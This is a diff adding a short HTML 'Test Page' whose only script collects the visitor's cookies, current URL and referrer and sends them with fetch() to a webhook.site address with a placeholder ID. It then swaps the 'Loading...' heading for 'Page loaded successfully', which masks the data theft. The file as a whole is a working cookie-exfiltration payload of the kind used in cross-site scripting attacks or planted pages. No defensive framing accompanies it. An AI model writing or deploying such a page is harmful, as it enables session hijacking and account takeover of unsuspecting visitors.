@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Test Page</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    var cookies = document.cookie;
+    var loc = window.location.href;
+    var ref = document.referrer;
+    
+    fetch('https://webhook.site/YOUR-UNIQUE-ID?cookies=' + encodeURIComponent(cookies) + '&url=' + encodeURIComponent(loc) + '&ref=' + encodeURIComponent(ref))
+    
+    document.querySelector('h1').innerHTML = 'Page loaded successfully';
+  </script>
+</body>
+</html>
